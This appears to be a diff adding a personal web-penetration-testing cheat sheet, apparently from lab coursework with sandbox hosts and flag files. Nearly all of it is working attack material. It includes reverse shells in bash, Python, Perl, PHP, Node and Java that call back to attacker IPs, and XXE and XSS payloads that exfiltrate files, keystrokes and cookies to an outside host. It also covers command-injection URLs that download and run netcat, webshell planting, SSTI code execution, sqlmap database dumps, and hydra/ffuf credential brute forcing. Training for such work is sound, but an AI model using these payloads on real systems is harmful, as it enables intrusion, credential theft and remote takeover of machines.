@@ -1,0 +1,329 @@
+https://cheatsheet.hackmanit.de/template-injection-table/
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http<ip/FUZZ -ic -e .php,.html
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <IP address>  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
+ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242
+ffuf -w /path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401
+ffuf -w users.txt -u http://enum-sandbox/auth/login -X POST -d 'username=FUZZ&password=bar' -H 'Content-Type: application/x-www-form-urlencoded'
+*ffuf -w /home/kali/usernames.txt -u http://192.168.66.108/auth/login -X POST -d 'username=FUZZ&password=bar' -H 'Content-Type: application/x-www-form-urlencoded'
+100'+UNION+ALL+SELECT+@@version,32,32,32--+
+sudo apt install hakrawler
+echo "http://enum-sandbox" | hakrawler -u
+sudo apt install payloadsallthethings
+
+Nmap: 
+sudo nmap -p 80 -sC -sV -Pn <ip>
+sudo nmap -p80 $IP
+sudo nmap -p80 -sV $IP
+cd /usr/share/nmap/scripts --> ls -lsaht |grep -I 'http' (view all)
+nmap -p80 --script=http-enum $IP  (DD)
+nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP
+nmap -p80 --script=http-wordpress-enum offsecwp
+
+wfuzz:
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404,403 -u "$URL/FUZZ"    (also fuzz all extensions eg:php,aspx,pdf,txt like FUZZ.pdf/txt)
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$URL"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 "$URL"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$URL"
+wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 http://offsecwp:80/index.php?fpv=FUZZ
+wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://offsecwp:80/wp-login.php  (--hh 6059 "URL")
+
+XXE:
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data ANY >
+<!ENTITY lastname SYSTEM " file:///etc/passwd">
+]>
+<Contact>
+  <lastName>&lastname;</lastName>
+  <firstName>Tom</firstName>
+</Contact>
+=========================================
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data ANY >
+<!ENTITY lastname SYSTEM "http://<our ip address>/somefile">
+]>
+<Contact>
+  <lastName>&lastname;</lastName>
+  <firstName>Tom</firstName>
+</Contact>
+
+<!ENTITY % content SYSTEM "file:///etc/passwd">
+<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://your ip address/out?%content;'>" >
+
+Directory Traversal
+cat ../../etc/passwd
+curl -v  -o megacorp.txt
+Absolute path: ?path=/var/www/html/data.txt
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://dirTravSandbox:80/relativePathing.php?path=../../../../../../../../../../FUZZ
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 81,125 http://dirTravSandbox/relativePathing.php?path=../../../../../../../../../../../../FUZZ
+
+IDOR
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H "Cookie: value" http://idor-sandbox:80/user/?uid=FUZZ
+
+SSRF
+netstat -lnt
+curl http://127.0.0.1:8080
+sudo systeml restart apache2 --> http:kali-ip/hello-ssrf (browser) --> sudo tail /var/log/apache2/access.log
+http://127.0.0.1:80 
+http://127.0.0.1/api
+http://localhost/status
+file:///etc/passwd
+file:///c:/windows/win.ini
+nc -nvlp 9000
+curl gopher://127.0.0.1:9000/hello-gopher
+gopher%3a//127.0.0.1%3a80/_POST%2520/api/admin/create%2520HTTP/1.1%250aContent-Type%3a%2520application/x-www-form-urlencoded%250aContent-Length%3a%252030%250a%250ausername%3dbbadmin%26password%3dadmin
+
+SQL:
+Oracle --> 11 OR id=12
+8.2.4 --> db=mysql&sort=10&order=desc
+**sqlmap -u "http://192.168.57.101/api/query" --data="db=mssql^&query=*" --level=3 --risk=3 --dbs --flush-session --tamper=space2comment,between 
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order"
+sqlmap -u "http://target.com/vuln.php?id=1" --level=3 --risk=2 --batch --dbs
+sqlmap -u "http://target.com/vuln.php?id=1" --level=3 --risk=2 --batch -D target_db --tables
+sqlmap -u "http://target.com/vuln.php?id=1" --level=3 --risk=2 --batch -D target_db -T target_table --dump
+sqlmap -u "http://target.com/vuln.php?id=1" --level=3 --risk=2 --batch -D target_db -T target_table -C "id,username,password" --dump
+sqlmap -u "http://target.com/vuln.php?id=1" --level=3 --risk=2 --batch --file-write="/path/to/webshell.php" --file-dest="/var/www/html/webshell.php"
+sqlmap -u "http://target.com/vuln.php?id=1" --level=3 --risk=2 --batch --os-shell
+
+POSTGRE SQL command:
+create table tmp(data text);
+copy tmp from '/etc/passwd';
+select * from tmp;
+
+    or
+SELECT pg_read_file('/tmp/flag.txt')
+select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'sTable';
+
+MySQL database: SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')
+
+Command Injection
+Python stable shell:
+?ip=127.0.0.1 | ls
+Browser command --> nc 192.168.49.59 4444 -e /bin/bash
+nc -lvp 4444
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+If blacklisted --> `echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`
+Openssl, xxd, base32
+Alternate for ";", "|", and "&" -> $ls,${ls},sleep(5),systeminfo,whoami,cat /etc/shadow,id,\`whoami`\
+
+http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|/bin/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
+
+http://ci-sandbox/php/index.php?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+
+http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20192.168.49.51%209090%20-e%20%2Fbin%2Fbash%27)%22%20%3E%20%2Fvar%2Ftmp%2Foffsec.js%20%3B%20node%20%2Fvar%2Ftmp%2Foffsec.js
+
+http://ci-sandbox/php/index.php?ip=127.0.0.1;php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27%5C%22)%3B%22
+
+http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.49.51%22%3B%24p%3D9090%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
+
+<%= process.mainModule.require('child_process').exec("cat /root/proof.txt | nc 192.168.49.58 4444").toString() %>
+<%= proprocessess.mainModule.requrequireire('child_procprocessess').exexecec("cat /root/proof.txt | nc 192.168.49.58 4444").toString() %>
+
+
+wget alternatives -> curl,aria2c,axel
+http://192.168.60.101/php/file_transfer_exercise.php?ip=127.0.0.1;%20which%20wget
+wget%20http://192.168.49.51:80/nc%20-O%20/var/tmp/nc%20;%20chmod%20755%20/var/tmp/nc%20;%20/var/tmp/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
+
+ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthru(\$_GET[%27cmd%27]);+?%3E%3C/pre%3E%22+%3E+/var/www/html/webshell.php
+
+
+php -r '$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.49.51",9090);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.49.51",9090);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.49.51",9090);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.49.51",9090);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+
+?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+
+?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20192.168.49.51%209090%20-e%20%2Fbin%2Fbash%27)%22%20%3E%20%2Fvar%2Ftmp%2Foffsec.js%20%3B%20node%20%2Fvar%2Ftmp%2Foffsec.js
+
+SSTI
+
+FREEMARKER
+
+${"freemarker.template.utility.Execute"?new()("whoami")}
+${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}
+
+PUG
+- var require = global.process.mainModule.require
+= require('child_process').spawnSync('whoami').stdout
+--------------------------------------------------------------------------------------------------
+- var require = global.process.mainModule.require
+= require('child_process').execSync('cat /root/flag.txt').toString() or = require('child_process').spawnSync('ls').stdout.toString()
+------------------------------------------------------------------------------------
+Jinja
+{{config.flag|pprint}}
+
+TWIG
+{{[0]|reduce('system','whoami')}}
+{% for %} -> {% for item in items %}{{ item }}{% endfor %}
+{% if %} -> {% if name == 'John' %}Hello, John!{% endif %}
+{% while %} -> {% set i = 0 %}{% while i < 5 %}{{ i }}{% set i = i + 1 %}{% endwhile %}
+{{[0]|reduce('system','cd ../; cat flag.txt')}}
+{{[0]|filter('system','cd ../; cat flag.txt')}}
+{{[0]|reduce('exec','ls -l')}}  **exec or shell_exec or passthru
+{{[0]|reduce('system','curl http://192.168.49.51/helloFromTheOtherSide')}}
+{{[0]|reduce('system','nc 192.168.49.57 4444 -e /bin/bash')}}
+{{[0]|reduce('system','cat /Proof.txt')}}
+
+MUSTACHE & HANDLEBARS
+{{read "/etc/passwd"}}
+
+CEWL:
+sudo cewl -d 2 -m 5 -w wordlist.txt <192.168.55.121>
+cewl --write output.txt --lowercase -m 4 <http://enum-sandbox/manual>
+ls /usr/bin | grep -v "/" > binaries.txt
+hydra -l <username> -P wordlist.txt -s 80 example.com http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
+**hydra -v -l Devon -P wordlist.txt -s 80 192.168.55.121 http-form-post "/dev/index.php:username=^USER^&password=^PASS^:F=Incorrect Password for User Devon"
+
+SSRF:
+13.3.2 --> http://metadata.web200.local/latest/meta-data/flag
+http://127.0.0.1/flag --> OS{whatAliceFoundThere}
+http://127.0.0.1:80 
+http://127.0.0.1/api
+
+
+13.3.4 --> file:///app/config.ini
+[config]
+password = twasbryllyg
+apiKey = chesirecat
+
+Wordlist:
+cd /usr/share/seclists/   -> ls -lsaht
+sudo cewl -d 2 -m 5 -w ourWordlist.txt www.google.com --> ls -lsa ourWordlist.txt --> cat ourWordlist.txt
+ls -sa /usr/bin | sed 's/[0-9]*//g' | sed -r 's/\s+//g' |sort -u > binaries-wordlist.txt
+
+gobuster --help
+gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301
+gobuster dns -d google.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+
+Hakrawler and the Wayback Machine
+cd $HOME/go/bin --> echo "https://www.megacorpone.com/" > urls.txt --> cat urls.txt |./hakrawler
+
+>?php
+Passthru("id");
+?>
+
+Xss
+function logKey(event){
+        fetch("http://192.168.49.51/k?key=" + event.key)
+
+<script src="http://192.168.49.51/xss.js/></script>
+
+<%
+X= 7*7
+%>
+
+Result: ${X}
+
+:${self.module.cache.util.os.popen('whoami').read()}
+:${self.module.cache.util.os.popen('cat proof.txt').read()}
+
+${__import__('os').popen('whoami').read()}
+               (optional)
+${_import_('os').system('python3 -c \'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("192.168.49.59",9090));
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\")}
+
+;bash -c 'bash -i >& /dev/tcp/192.168.49.59/9090 0>&1' 
+test;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.57/9090+0>%261'
+
+To try - sql injection with post body of register and login pages (trail & error)
+Directory traversal payloads:
+../../../../etc/passwd
+../../../../../../../../etc/hosts
+../../../../../../../../home/admin/proof.txt 
+
+
+Keylogging with fetch method:
+function logKey(event){
+	fetch("http://192.168.49.62/k?=" +event.key);
+}
+document.addEventListener('keydown', logKey);
+
+XSS payloads:
+<svg><circle><set/onbegin='self["alert"](document.domain)'/attributename='fill'>
+x+style=content-visibility:auto%20oncontentvisibilityautostatechange%3dalert()
+
+
+Stealing cookie through XSS:
+let cookie = document.cookie
+let encodedCookie = encodeURIComponent(cookie)
+fetch("http://192.168.49.57/exfil?data=" + encodedCookie)
+
+<script src="KALI_IP_ADDRESS/xss.js></script>
+
+Stealing cookie through XSS & Bypassing CORS:
+let data = JSON.stringify(document.cookie);
+let encodedData = encodeURIComponent(data);
+let img = new Image();
+img.src = "http://192.168.49.56/exfil?data=" + encodedData;
+document.body.appendChild(img);
+
+
+document.write('<img src="http://192"/?bogus='+document.cookie+'" />');
+
+Creating user:
+var xhttp = new XMLHttpRequest();
+var creds = 'email=' + document.getElementById('email').value + '&password=' + document.getElementById('password').value + "&name=" + document.getElementById('name').value + "&username=" + document.getElementById('username').value;
+        xhttp.open("GET", "/admin/users/add?" + creds, true);
+        xhttp.send();
+
+Encoded user:
+var xhttp = new XMLHttpRequest();
+var creds = 'email=' + encodeURIComponent('testadmin@test.com')+
+            '&password=' +encodeURIComponent('test') +
+            '&name=' +encodeURIComponent('testadmin') +
+            '&username=' +encodeURIComponent('testadmin');
+   xhttp.open("GET", "/admin/users/add?" + creds, true);
+   xhttp.send();
+
+
+Checking ping through xss:
+<img src=x onerror="fetch('http://192.168.45.56/callback?c=1')">
+
+<img src=x onerror="var s=document.createElement('script');
+s.src='http://192.168.49.57/adduser.js';document.body.appendChild(s);">
+
+
+Reading flag:
+const params = new URLSearchParams();
+params.append('cmd','curl <ip>/$(cat /root/proof.txt)');
+fetch('http://localhost:3000/run_command',{
+method:'POST',
+headers: {'Content-Type':application/x-www-form-urlencoded'},
+body: params.toString()
+});
+
+
+sudo apt install hakrawler
+which hakrawler
+echo "http://enum-sandbox" | hakrawler -u
+dirb http://enum-sandbox
+With file extension: dirb http://example.com /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -X .php,.asp,.html
+sudo apt install payloadsallthethings
+
+
+Enumeration:
+ffuf -w /usr/share/seclists/Usernames/cirt-default-usernames.txt -u http://192.168.56.108/auth/login -X POST -d 'username=FUZZ&password=bar' -H 'Content-Type: application/x-www-form-urlencoded' -fc 404,403,500 -mc 200,201,302 -fs 2093
+
+nmap -Pn <enum-sandbox>
+nmap -sV <enum-sandbox>
+nmap -p 80 --script http-methods <enum-sandbox>
+Server header: curl -I <http://enum-sandbox>
+netcat -v <enum-sandbox> 22
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+class RevShell {
+    public static void main(String[] args) throws Exception {
+        String host="192.168.48.2";int port=4444;
+        String cmd="cmd.exe";
+        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+    }
+}
+
